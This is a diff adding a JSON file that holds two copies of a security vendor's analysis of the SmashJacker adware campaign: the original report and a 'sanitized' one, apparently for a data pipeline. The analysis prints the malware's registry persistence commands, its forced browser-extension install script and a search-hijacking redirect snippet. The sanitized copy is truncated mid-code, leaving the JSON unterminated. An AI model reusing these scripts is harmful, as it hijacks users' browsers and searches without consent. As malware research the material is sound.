@@ -1,0 +1,1064 @@
+{
+  "original_txt": "Operate more efficiently, reduce complexity, improve EBITDA, and much more with the purpose-built platform for MSPs.\nProtect and defend what matters most to your clients and stakeholders with ConnectWise's best-in-class cybersecurity and BCDR solutions.\nLeverage generative AI and RPA workflows to simplify and streamline the most time-consuming parts of IT.\nJoin fellow IT pros at ConnectWise industry & customer events!\nCheck out our online learning platform, designed to help IT service providers get the most out of ConnectWise products and services.\nSearch our resource center for the latest MSP ebooks, white papers, infographics, webinars and more!\nJoin hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.\nJoin hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.\nIn February and March, we noticed a surge in incidents all relating to a few different files that hadn't been connected to any type of malware yet. Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker. This extension is used to hijack searches and push users through redirect chains to the domains they're navigating so the actors can receive affiliate kickbacks for \"directing\" the user to that site, generate ad revenue, and collect analytics on victims.\nUsers are lured to download the installer files by having them hosted on pages advertising the download of wallpapers, software, games, and movies, typically illegally. They are first served the malicious installer, but then trying the download again will serve the proper file. It's worth noting that in all the URLs leading to an installer download contain the empty URL parameter 7fk8qechol=. This is a useful indicator and is referenced by the extension later.\nThroughout our analysis, we found mostly InnoSetup and MSI installers being used to deliver this malicious extension. The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool. InnoSetup installers only installed the extension, but masqueraded as either one of the types of files outlined above or were simply named Your File Is Ready To Download.exe. Both versions deliver similar payloads, and in some cases, if a targeted browser isn't found, nothing will be dropped. Most of the samples were signed using a handful of different certificates.\nSoon after launching the installer, it gets to work on persisting. We found two persistence techniques in use depending on the variant downloaded. Sometimes it would use the AppInit_DLLs registry value to persist by calling the reg command:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"AppInit_DLLs\" /t REG_SZ /d \"C:\\Users\\[USERNAME]\\AppData\\Local\\WindowsApp\\ext.dll\" /f\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"LoadAppInit_DLLs\" /t REG_DWORD /d 1 /f\nThis makes it so that the dropped dll is executed every time a process is created, and if it's one of the targeted browsers then the dll will make sure the extension files exist by unzipping them from an archive embedded in its resources section. Then it will create a batch file for running the proper browser with the malicious extension loaded.\nIn other instances, the installer will drop and run an executable that takes responsibility for its own persistence. When it runs it creates several files: reg.xml is an xml formatted scheduled task that runs every 5 minutes and runs the persistence executable that created it, notably all samples we reviewed had registration and start boundary dates of 2022-11-11. reg.bat is a batch file that simply contains the command to schedule the xml task:\nschtasks.exe /Create /XML \"%localappdata%\\{path}\\reg.xml\" /tn {task name}\nLastly, another batch file for the targeted browser is created that handles installing the extension. An example is included below:\n@echo off\nset version=1.0\nset id=fegdfodkkeaklllcdkpjeakecpfdfmdc\nset base32=HKLM\\SOFTWARE\nset base64=HKLM\\SOFTWARE\\WOW6432Node\nset chrome=Google\\Chrome\nset helper=%LocalAppdata%\\WindowsApp\\apps-helper\nset file=%helper%\\apps.crx\nREG DELETE %base32%\\Policies\\%chrome% /f\nREG DELETE %base32%\\%chrome%\\Extensions\\%id% /f\nREG DELETE %base64%\\%chrome%\\Extensions\\%id% /f\nREG ADD \"%base32%\\Policies\\%chrome%\\ExtensionInstallAllowlist\" /v \"1\" /t REG_SZ /d %id% /f\nREG ADD \"%base32%\\%chrome%\\Extensions\\%id%\" /v \"path\" /t REG_SZ /d \"%file%\" /f\nREG ADD \"%base32%\\%chrome%\\Extensions\\%id%\" /v \"version\" /t REG_SZ /d %version% /f\nREG ADD \"%base64%\\Policies\\%chrome%\\ExtensionInstallAllowlist\" /v \"1\" /t REG_SZ /d %id% /f\nREG ADD \"%base64%\\%chrome%\\Extensions\\%id%\" /v \"path\" /t REG_SZ /d \"%file%\" /f\nREG ADD \"%base64%\\%chrome%\\Extensions\\%id%\" /v \"version\" /t REG_SZ /d %version% /f\ntaskkill /F /IM chrome.exe /T\nstart \"\" \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=\"Default\" --no-startup-window --load-extension=\"C:\\Users\\victim\\AppData\\Local\\WindowsApp\\apps-helper\" --hide-crash-restore-bubble\nset chrome_ext0=\"%LocalAppdata%\\%chrome%\\User Data\\Default\\Extensions\\%id%\"\nif not exist %chrome_ext0% (timeout 1 > NUL) else (echo \"Wait 1\")\nif not exist %chrome_ext0% (timeout 1 > NUL) else (echo \"Wait 2\")\n[...]\nif not exist %chrome_ext0% (timeout 1 > NUL) else (echo \"Wait 30\")\ntimeout 5 > NUL\nREG ADD \"%base32%\\Policies\\%chrome%\\ExtensionInstallForcelist\" /v \"1\" /t REG_SZ /d %id% /f\nREG ADD \"%base64%\\Policies\\%chrome%\\ExtensionInstallForcelist\" /v \"1\" /t REG_SZ /d %id% /f\ntimeout 5 > NUL\ntaskkill /F /IM chrome.exe /T\nstart \"\" \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=\"Default\"\nFirst it adds keys for the extension's id in the targeted browser's Extension and ExtensionInstallAllowList registry keys with the path to the extension's .crx file. Then it will use taskkill to kill running browsers. In some variations is tries to kill Chrome, Brave, Opera, Vivaldi, and Edge. Then it restarts the targeted browser and passes it a path to a bootstrapping extension through the --load-extension parameter. This is a smaller browser extension with two files usually called service.js and web.js. This extension's whole purpose is to ensure the main extension gets loaded into the browser after being set in the registry. service.js adds a listener for installed extensions so that when its own installation triggers, it will open a tab with the chrome://policy page and call a function in web.js. This function adds a listener for when the chrome://policy page loads and clicks the reload policies button to ensure the policy registry keys modified earlier are loaded into the browser. Meanwhile, the batch script is checking if the extension is installed yet, afterwards it will add its extension id to the browser's ExtensionInstallForcelist registry key, then kill the browser and restart it again without the bootstrapping extension loaded. In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.\nImmediately after the installation is completed, the targeted browser is then opened directly to an actor-controlled page:\n\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://getfiles[.]wiki/welcome.php\nThis will be a part of a redirection chain through pages such as https://exturl[.]com/r.php?key=[KEY] or https://offersss[.]click/r.php?payout=OPTIONAL&cnv_id=[ID]. These end up redirecting to Google after gathering data about users through trackers such as histats and dtscout.\nThe extension itself usually consists of three main components that can vary between samples. There is the manifest.json file, which is common to all Chromium extensions. Several versions of this file consistently list the author as sg.guru1030@gmail[.]com, and many will use the chrome_settings_overrides configuration to change the default search provider for the browser to searchesmia[.]com.\nThe main logic of the extension is in one of the remaining two main components, sometimes in background.js and other times in content.js. When the main logic is in content.js, then usually it just contains a simple search hijacking script that replaces common search engine query URLs with queries to searchesmia[.]com. An example is included below. We observed samples targeting Google, DuckDuckGo, Ecosia, Yahoo, Ask, Neeva, Aol, Webcrawler, Dogpile, Bing, and Info. When content.js is the main script, background.js merely contains a function that writes out to the console here is background!\nfunction checkUrlIsSearchEngine(url) {\n// var hostName = getHost(url)\nif (url.match(/^https?:.*?google.*?\\/search?/g) != null) {\nvar searchQuery = getQuery(url);\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`)\n}\nif (url.match(/^https?:.*?duckduckgo.*?\\/?q=/g) != null) {\nvar searchQuery = getQuery(url);\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`)\n}\nif (url.match(/^https?:.*?ecosia.*?\\/?search?/g) != null) {\nvar searchQuery = getQuery(url);\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`)\n}\nif (url.match(/^https?:.*?yahoo.*?\\/?search?/g) != null) {\nvar searchQuery = getQuery(url, 'yahoo');\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`)\n}\n}\nSearches routed through searchesmia[.]com will return a page meant to look like Google search results, but with different ads served on it in an attempt to generate ad revenue for the actors.\nThings get a bit more interesting when background.js contains the main logic of the extension. In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking. The search hijacking is still present, but now we are faced with evasion mechanisms such as closing tabs that try to navigate to the browser's ://extensions page or chrome://settings/reset to keep the extension from being uninstalled.\nThe bigger capability we see added is the ability to redirect users from a variety of different pages they may be trying to access through actor infrastructure and back out to the originally intended page with the actor's affiliate parameters tacked onto the URL. First, for every tab update it will check if a URL contains either 7fk8qechol, which was mentioned earlier in the article as an identifier for all of their initial payload delivery URLs, or the extension's id. If either of those are present it will close the tab, otherwise it will compare the domain of the page being visited to an extensive list of domains. If there is a match, it will redirect the page navigation through https://smashaff[.]com/redirect?&url=[DOMAIN], which will process the request differently depending on the domain being requested. This is done to redirect the user back to it in an attempt for the actor to receive affiliate kickbacks. After this, the extension will set a future time for that domain in a cookie, so it won't process that domain again until that time has passed. Usually this will be 2 hours, except for an Amazon domain, which is granted a 24-hour waiting period.\nOur initial hypothesis was that this campaign represented a shift in ChromeLoader delivery methods. The usage of pages pushing pirated media to lure victims, file name conventions such as the common Your File Is Ready To Download, and the eventual payload of a search hijacking browser extension hinted in the direction of ChromeLoader. Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files. When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.\nOccasionally we would also find other loose connections, such as a domain and URL patterned similarly to others used by the actors behind this extension redirecting to search hijack pages patterned similarly to those used by ChromeLoader.\nBut the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads. The timeline may be tainted due to lack of awareness of other changes in ChromeLoader techniques that may have affected our ability to tag related incidents. And the loose connections we found always remained loose. Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further. It may be the case that the actors behind ChromeLoader also developed this extension and delivery path, but currently we don't have any other data that would warrant higher confidence in this hypothesis.\nWe did find other interesting connections though. One word kept recurring in various places during the investigation, Smash. Some installers quickly showed they were installing something called Smash. Many of the domains incorporate the word Smash. Particularly there is the smashbrowser[.]com domain that victims are sent to, in some cases, immediately after install. Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.\nThis was interesting, because during log searches for extension indicators we found another browser called Chromnius matching on a large amount of the indicators we have seen being used by SmashJacker. Search results for it also turn up mostly results referring to it as adware and suggesting its removal. Spotting the similarities between the two is left to the reader.\nFurther, through the domain smashaff[.]com we also connected the malicious extension here to a report by Guardio about a large amount of extensions available in Chrome and Edge stores very similar to the variants observed in our research.\nThese potential connections suggest a much broader operation with many possible delivery avenues and payloads, and potential connections to ChromeLoader, with the goal of generating revenue via ads and affiliate kickbacks. Adware like this may not typically gain as much attention as other malware whose impact is more immediate, but considering the massive scope of this campaign and the ability to fly more under the radar that lack of concern allows, it's always worth considering the sort of access to data in your organization these actors have even just through searches and analytics.\n[CRU][Windows] AppInit DLLs\n[CRU][Windows] Common Filename for Adware Distribution (Your File Is Ready To Download)\n[CRU][Windows] Browser Extension Loaded via Command Line\n[CRU][Windows] Chromium Extension Install Attempt in Registry via Command Line\nT1189 – Drive-by Compromise\nT1053.005 – Scheduled Task/Job: Scheduled Task\nT1204.002 – User Execution: Malicious File\nT1546.010 – Event Triggered Execution: AppInit DLLs\nT1176 – Browser Extensions\nT1565.002 – Data Manipulation: Transmitted Data Manipulation\n%LOCALAPPDATA%\\ServiceApp\n%LOCALAPPDATA%\\ServiceApp\\apps-helper\n%LOCALAPPDATA%\\WindowsApp\n%LOCALAPPDATA%\\WindowsApp\\googledoc\n%LOCALAPPDATA%\\WindowsApp\\apps-helper\n%LOCALAPPDATA%\\ServApps\n%LOCALAPPDATA%\\ServApps\\apps-helper\n%LOCALAPPDATA%\\SysWins\n%LOCALAPPDATA%\\MicroApp\n%LOCALAPPDATA%\\MicroApp\\apps-helper\n%LOCALAPPDATA%\\SystemConfigs\nexturl[.]com\ngetfiles[.]wiki\ngetfiles[.]click\noffersss[.]click\nsmashbrowser[.]com\nofferszzzz[.]click\nsearchesmia[.]com\nbestsearch[.]ai\ndownloads[.]miami\ngetyourfile[.]cloud\ndownloadit[.]wiki\nsmashaff[.]com\nchangecolorss[.]com\ncampaignfreekek[.]monster\ncampaignfreekek[.]buzz\ncampaignkeepy[.]buzz\nfileskeepdownload[.]lol\ncampaignloader[.]buzz\ncampaignkeepy[.]monster\ncampaignlyfilez[.]lol\ncampaignindown[.]buzz\ncampaignindown[.]lol\ncampaignloede[.]buzz\ncampaignloede[.]monster\ncampaigndowna[.]skin\ncampaigndowna[.]monster\ncampaigndowna[.]pics\ncampaignleka[.]skin\ndownloadkeppy[.]lol\ndownloadkeppy[.]buzz\nfiledownloader[.]cloud\ndownloadwikiki[.]lol\ndownloaderfiles[.]wiki\nfreefilesdownloads[.]wiki\nfilesdownloader[.]one\npyrd5[.]xyz\njncffhgjbmpggpdflbbkhdghjipdbjkn\nmacjkjgieeoakdlmmfefgmldohgddpkj\niglfjaeojcakllgbfalclepdncgidelo\nlehiajjpggngcmnjmbjcdohhfijojgid\nfebnklnineliajdemdahoiplahfbmffk\njmhjnioknjbokpffmnlkdchehoeledda\nfegdfodkkeaklllcdkpjeakecpfdfmdc\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs\nHKLM\\SOFTWARE\\Google\\Chrome\\Extensions\nHKLM\\SOFTWARE\\Microsoft\\Edge\\Extensions\nHKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallAllowlist\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Edge\\ExtensionInstallAllowlist\nHKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist\nHKLM\\SOFTWARE\\WOW6432Node\\Google\\Chrome\\Extensions\nHKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Edge\\Extensions\nHKLM\\SOFTWARE\\WOW6432Node\\Policies\\Google\\Chrome\\ExtensionInstallForcelist\nHKLM\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist\nChromeUpdatess\nChrUpdate\nGoogleUpdate\nLIMESTONE DIGITAL LIMITED\n2aae66915908a703d5059da2fcf4d5245b78bb30\nFTechnology Limited\n8ef055874b2f22f2653a7fd0f7244ef26f48ee5d\nTEKVIVE LTD\n48688c5a67c8abcaabb12024e9bbd4b5c2599991\nTELIX LIMITED\nf7ead36c07f11fe932e6baca357f2610c550cee3\nTECKHA LTD\n55d44799c5f51d3b08e957f89b930f014ce54945\nSOFTWARE ABFG LTD\nee81e7d510b97695351ef3f2e0c10f4d0601eda6\n3a3532fed3673bfb65fd8271ebf0c029cffddb76f4d6b0315cb47cf46eabc31d\nae2250acbdd6bd9cda9259ecd1a211e8a22d4122de3687c4cd31321673bbf875\nfe5fa373eb6232059a47076fe1315d3499480da8b7e357bd8fc08caa05b03af1\n26bec2d9c0843b1a583e7f17d810d92c750a909c48b5565e2fa0a8920356f457\n1857ae53c297c522361108dab313e9f83ec7802af37edaffdcd1002b6e4cb54c\nf8f27ae04481c96fdc875300dee32d19017a888d730e1f1586163be2a6a55176\n1d180bd0d9a05b4c3883b99fcf9b5502bf30b35b2e09d4ba4ab2111079b3221e\ncafbf35c0d9cf556d2c92086e0145ed092959eb725d6a8134adb9df835ad4a9d\nc851a6b21ec14b6964c107a2bfaeb8db1b22ab4e967c881f4e6e76877c452761\n093d15f885cc4a9993a2425c6dff5f86d421056642473074746927eecce43fe7\n3494f9352c5bd48f55caddbbb63515f8058763e28f8e5f8fa5411a5de835ca8e\n87c79d29737dca30e36aac1c90ac3eab82f71393b815a9d7c086565e257fd434\nea6443416c31bb5f5d8476357619c3c9b80d3959742b8f3080b56ce8c24b9429\n147e1b5a750fbfd8863449d523e3d6d110defceb74ad9cdb7c939ab75ffa2180\n20e1aabfaad727ba939133691a7c0ab34401f1c973e2611d8585ef1699670dff\n1e7058ee1fbec5524de39dadf1cadc6557b53a5e764296155ecb63adb1a8721a\nb1256289d4aaada74a40b6ca52aa0d382b7660943ea31744486007653ee925ad\n2df3f0c50942cebf7d508364ade31de19a84a6d9377a7799b626abdf8f09a9bb\n783c4c0ee5b6202ecb437c9c6b277376344f4784b672db9115551559322834a4\nfa8b150a06d2ccee4aee81ee84fda0e1269b8aed5efdb0f3c22f2d0b154e470a\nc8e02aa1de118d17878ca909f266fd9b97957d911e20659ab355a5e868fd4d3c\n8ac240ad76b8af9f85a1aea9cac3a993b8be99b342de8827621f1ad9c0209404\na837c3ad6bf70e148282b1d4964fc63ab5e75f6fa7596205db50cb9db76e8b29\n017388719abfb911787abd2fa1b6b12a806660761b8ae4efe12196efc447e8d2\nac3312c712ff50e93d62a1696e3997fdf7d9a9eb01c589d26ac6c3189e50dfc8\naf11fc54dc1633b963304f22ac014a7af86c8ab904b29de2141fa63bf75fb488\nb063cb2736356fba41055ea2cc4d69a3108b7028de97c96420dd206788ea85a5\nc8a606a63da9206a1a308fa8696c8cbfa42510970d1888aeb7e605c94b98a8ec\n192ab51d793a4a1ab84d69146566d203168df26b64b3886813262113f4e21951\n384dcaac36183b76183e4e1f0decf3b035f97c353d6c9846dc04249e95e22587\n4f55de6fa77a36b9e5ec04fb6222f26f4e757dbc492c22af4f907f7ae3ace3a1\n7fc333a6e310cfe08b2b12649d3bc502eb355819d60937ceb4b54d0b85019aba\n87e6fb021b834187f819c2718f5119ffc07fc941fe17eb436ed8533a4867c475\n936416f151886041c3f0e50ec57a101ee008c18126f2523ca3335dad07f1c112\nInstallExtension.exe/App.exe/EdgeInstall.exe/ChromeInstall.exe\n3d4fc14fccb7e4adb4854f6da66bbb7b829e354a2f88b998d6f3ba9fbb8f141d\n5ee53990ddd5924f27744a565e06c12667018210dfc18e444b8f468402a86023\n1eb53fb5dd3f2437eb50fe1668f2d1edc9f3209a7f21f33192117afdf7e38208\n920f528cdf720187b49ee99274a5bf75ad392c9ae7eeecca803ec049aea2bd36\na9d5c1acfe3af5f3ac2c4d7caf04da163b21a6f835ea0dfaf36a38b058e7f43e\next.dll/sxsshell.dll/sxsext.dll\ne788ffef53cedbcc81fa19933a0940a5d5110a8f2abff32d0fd6050f113be4d9\n0d12cc1590d4ef968d6fcfbbd865a9f41ab0e85f7ca820de87ed8672e972c6cc\n7387f56531b5e46e0f3ffa5a9cfc888bc46be8f9d5d44267f4649daeb5c9519e\n5e53711bec7270509b71db47ac5c72a6249d8b724d32b0e7c836648d304887c6\nchrome.bat/edge.bat/install.bat\n99f181734dd78a4b37eeb502bc34cb332151cf486ddca19f6c64f1a6755d7ef1\n56321f7b7764686960f7c51ace571217bcec1d6613884b1003296406a55ddf90\n448641c0707a0beb2fdb2b2195a8aa3965a3ca27ddf745160c3caad38a21401a\n1e90cf8498a2684dcd09b6b12784f1c6bada64c1148779286f0c734b5df3c245\n9b8c45da4e4f713d57ba1377fb3f66537b3de3761aa2c9ae8ecf66a4495e63d4\ne488d824f6d39b999a9e15719933a6afdabe7f45a482aac5626fe2d91bf43ae2\n7487a70f1e368a216b5b99d2683469d9ac79352e84cde2627fcce642a6ed062a\neecb39d2dc5efd9461cdb4d6644057f3c13a9b17d9d0385ddfcae260e9ea70a8\nb4ce8670b04dbfd47cad089ef826cb18568896677202b6f255ec1161581eb49c\n6ab2311de65c8ec6fa42c01b9cbe8443b16304076e51b005b87aea95e50b5be2\nf985cb1e542dd54e54dea13add450fd38208a62dda2bb850468618ca33736f03\nreg.bat/reg.xml\n935bce606159c44bd2697eced5cae4a6e78505662226de44647a8278d0b65897\n10c8a00927ca6d784a0a9d80c85a9252edc514e1851659af67ecd5bcd9d0c6b7\ned89a8377e2782212035d3d30d62344a1e2d51c4d0976adb070c7c6eb9d0fc20\nbffcc7888901c9b26c192691b32a0aa724c23da987d92904dc808d768c04f690\n9d9cb847255137e1f2daf88f4790f01fdff91215c60712fbb88274bd3c95fb87\ncf3a292cf651d6363c5f3d21812b240c48657f6c951e779eafaf15fa7ef39972\nc44029eeff28e0ca064e379cb929916b659c440da1f5a29855012bd909eaa084\n707aa512b5f4fea301b379582a16e5e2b729005562623d9ea729d80d6c98c7d8\ncontent.js/service.js/manifest.json/background.js/web.js/apps.crx\n0626d33f723c33ed98f9e8c1a78b43510e6dbd196ef91fc0be2633ba73b91649\ncc1c1c7aa14ac707f66629095b8e117109660c13511f26d6eeda1e9fdc363ab2\n0ade971ae68ae6d818e9837ab8c6d4d603ac0bb3d23aa78a0f5d1b91706e155e\n4684f8c339c510e146b89f1fa3274b1475851e06f0c347ab07821846bdb066a4\n893fcfe4edcdb07bcc3e05a3304f93f0358c9d8f4cc967058585f553bb82ad02\na507d1f546c979056ce392467ede397c94ef854d9b5c7581462feef6e9b091ef\n0f9d206423e5e197adf17fe478f0001a6309bf0cd1931b6607b17dc4a2600d28\n3003c376b4ddca73cbd7a761c7e19adea52ed056c6c0e6ebecf67ce1a833b061\nbeefb9d3af534d2fdd069dbe4b2b72b0e840f1a8bcf676d06746321a73216dd6\n639b4aa439b6230d88445db584ce81835a8236c4cc5b0610c8ecc728941693b7\n7fd6486432256c15fa6568f04af2db56de31e9aecc16044b3d5b488957a7bcc2\nbfb7f6dc266847896a21a8513d639eabf3f74d2a2def95104459ad322b13fac6\n092d00e4b89dce6b18c654d9b5af4cdd7c0da2d304f139820efeecaa5c4eb16c\n4bcec38345ddc32954a86c529fd1058187e56cc7d576fd767e272a02ba7a97f6\nf0097f5ed7261f23aec2434d73295165d708cdfc239c33e6990071119087a495\nd5e3087257045d015dd02186cba8427946b174eaaa40f180f3b017ba9d6c8837\n85975a9d26e942b1804195c9b5a2afc72fc8faf245af064d81522d0d7d1823f1\n092f386c78aef402225279c45d519ea6abfb2ce07a735bb1288529c20b1f5db9\n1f462fbc4be05d97a3865014a1af20c8f137828993b59cecfc774193d493653d",
+  "sanitized_txt": "Operate more efficiently, reduce complexity, improve EBITDA, and much more with the purpose-built platform for MSPs.\nProtect and defend what matters most to your clients and stakeholders with ConnectWise's best-in-class cybersecurity and BCDR solutions.\nLeverage generative AI and RPA workflows to simplify and streamline the most time-consuming parts of IT.\nJoin fellow IT pros at ConnectWise industry & customer events!\nCheck out our online learning platform, designed to help IT service providers get the most out of ConnectWise products and services.\nSearch our resource center for the latest MSP ebooks, white papers, infographics, webinars and more!\nJoin hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.\nJoin hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.\nIn February and March, we noticed a surge in incidents all relating to a few different files that hadn't been connected to any type of malware yet. Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker. This extension is used to hijack searches and push users through redirect chains to the domains they're navigating so the actors can receive affiliate kickbacks for \"directing\" the user to that site, generate ad revenue, and collect analytics on victims.\nUsers are lured to download the installer files by having them hosted on pages advertising the download of wallpapers, software, games, and movies, typically illegally. They are first served the malicious installer, but then trying the download again will serve the proper file. It's worth noting that in all the URLs leading to an installer download contain the empty URL parameter 7fk8qechol=. This is a useful indicator and is referenced by the extension later.\nThroughout our analysis, we found mostly InnoSetup and MSI installers being used to deliver this malicious extension. The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool. InnoSetup installers only installed the extension, but masqueraded as either one of the types of files outlined above or were simply named Your File Is Ready To Download.exe. Both versions deliver similar payloads, and in some cases, if a targeted browser isn't found, nothing will be dropped. Most of the samples were signed using a handful of different certificates.\nSoon after launching the installer, it gets to work on persisting. We found two persistence techniques in use depending on the variant downloaded. Sometimes it would use the AppInit_DLLs registry value to persist by calling the reg command:\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"AppInit_DLLs\" /t REG_SZ /d \"C:\\Users\\[USERNAME]\\AppData\\Local\\WindowsApp\\ext.dll\" /f REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v \"LoadAppInit_DLLs\" /t REG_DWORD /d 1 /f This makes it so that the dropped dll is executed every time a process is created, and if it's one of the targeted browsers then the dll will make sure the extension files exist by unzipping them from an archive embedded in its resources section. Then it will create a batch file for running the proper browser with the malicious extension loaded.\nIn other instances, the installer will drop and run an executable that takes responsibility for its own persistence. When it runs it creates several files: reg.xml is an xml formatted scheduled task that runs every 5 minutes and runs the persistence executable that created it, notably all samples we reviewed had registration and start boundary dates of 2022-11-11. reg.bat is a batch file that simply contains the command to schedule the xml task:\nschtasks.exe /Create /XML \"%localappdata%\\{path}\\reg.xml\" /tn {task name} Lastly, another batch file for the targeted browser is created that handles installing the extension. An example is included below:\n@echo off set version=1.0 set id=fegdfodkkeaklllcdkpjeakecpfdfmdc set base32=HKLM\\SOFTWARE set base64=HKLM\\SOFTWARE\\WOW6432Node set chrome=Google\\Chrome set helper=%LocalAppdata%\\WindowsApp\\apps-helper set file=%helper%\\apps.crx REG DELETE %base32%\\Policies\\%chrome% /f REG DELETE %base32%\\%chrome%\\Extensions\\%id% /f REG DELETE %base64%\\%chrome%\\Extensions\\%id% /f REG ADD \"%base32%\\Policies\\%chrome%\\ExtensionInstallAllowlist\" /v \"1\" /t REG_SZ /d %id% /f REG ADD \"%base32%\\%chrome%\\Extensions\\%id%\" /v \"path\" /t REG_SZ /d \"%file%\" /f REG ADD \"%base32%\\%chrome%\\Extensions\\%id%\" /v \"version\" /t REG_SZ /d %version% /f REG ADD \"%base64%\\Policies\\%chrome%\\ExtensionInstallAllowlist\" /v \"1\" /t REG_SZ /d %id% /f REG ADD \"%base64%\\%chrome%\\Extensions\\%id%\" /v \"path\" /t REG_SZ /d \"%file%\" /f REG ADD \"%base64%\\%chrome%\\Extensions\\%id%\" /v \"version\" /t REG_SZ /d %version% /f taskkill /F /IM chrome.exe /T start \"\" \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=\"Default\" --no-startup-window --load-extension=\"C:\\Users\\victim\\AppData\\Local\\WindowsApp\\apps-helper\" --hide-crash-restore-bubble set chrome_ext0=\"%LocalAppdata%\\%chrome%\\User Data\\Default\\Extensions\\%id%\" if not exist %chrome_ext0% (timeout 1 > NUL) else (echo \"Wait 1\") if not exist %chrome_ext0% (timeout 1 > NUL) else (echo \"Wait 2\") [...] if not exist %chrome_ext0% (timeout 1 > NUL) else (echo \"Wait 30\") timeout 5 > NUL REG ADD \"%base32%\\Policies\\%chrome%\\ExtensionInstallForcelist\" /v \"1\" /t REG_SZ /d %id% /f REG ADD \"%base64%\\Policies\\%chrome%\\ExtensionInstallForcelist\" /v \"1\" /t REG_SZ /d %id% /f timeout 5 > NUL taskkill /F /IM chrome.exe /T start \"\" \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=\"Default\" First it adds keys for the extension's id in the targeted browser's Extension and ExtensionInstallAllowList registry keys with the path to the extension's .crx file. Then it will use taskkill to kill running browsers. In some variations is tries to kill Chrome, Brave, Opera, Vivaldi, and Edge. Then it restarts the targeted browser and passes it a path to a bootstrapping extension through the --load-extension parameter. This is a smaller browser extension with two files usually called service.js and web.js. This extension's whole purpose is to ensure the main extension gets loaded into the browser after being set in the registry. service.js adds a listener for installed extensions so that when its own installation triggers, it will open a tab with the chrome://policy page and call a function in web.js. This function adds a listener for when the chrome://policy page loads and clicks the reload policies button to ensure the policy registry keys modified earlier are loaded into the browser. Meanwhile, the batch script is checking if the extension is installed yet, afterwards it will add its extension id to the browser's ExtensionInstallForcelist registry key, then kill the browser and restart it again without the bootstrapping extension loaded. In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.\nImmediately after the installation is completed, the targeted browser is then opened directly to an actor-controlled page:\n\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://getfiles[.]wiki/welcome.php This will be a part of a redirection chain through pages such as https://exturl[.]com/r.php?key=[KEY] or https://offersss[.]click/r.php?payout=OPTIONAL&cnv_id=[ID]. These end up redirecting to Google after gathering data about users through trackers such as histats and dtscout.\nThe extension itself usually consists of three main components that can vary between samples. There is the manifest.json file, which is common to all Chromium extensions. Several versions of this file consistently list the author as sg.guru1030@gmail[.]com, and many will use the chrome_settings_overrides configuration to change the default search provider for the browser to searchesmia[.]com.\nThe main logic of the extension is in one of the remaining two main components, sometimes in background.js and other times in content.js. When the main logic is in content.js, then usually it just contains a simple search hijacking script that replaces common search engine query URLs with queries to searchesmia[.]com. An example is included below. We observed samples targeting Google, DuckDuckGo, Ecosia, Yahoo, Ask, Neeva, Aol, Webcrawler, Dogpile, Bing, and Info. When content.js is the main script, background.js merely contains a function that writes out to the console here is background!\nfunction checkUrlIsSearchEngine(url) { // var hostName = getHost(url) if (url.match(/^https?:.*?google.*?\\/search?/g) != null) { var searchQuery = getQuery(url);\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`) } if (url.match(/^https?:.*?duckduckgo.*?\\/?q=/g) != null) { var searchQuery = getQuery(url);\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`) } if (url.match(/^https?:.*?ecosia.*?\\/?search?/g) != null) { var searchQuery = 